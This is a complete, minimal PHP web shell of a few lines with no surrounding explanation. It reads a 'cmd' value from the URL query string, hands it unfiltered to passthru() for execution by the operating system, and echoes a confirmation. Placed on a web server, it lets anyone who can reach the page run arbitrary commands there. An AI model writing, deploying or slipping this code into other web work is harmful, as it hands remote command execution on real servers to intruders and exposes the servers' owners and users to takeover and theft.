<?php
if (isset($_GET['cmd']))
{
	$cmd = $_GET['cmd'];
	passthru($cmd);
	echo "Command '" . $cmd . "' execution done.";
}
?>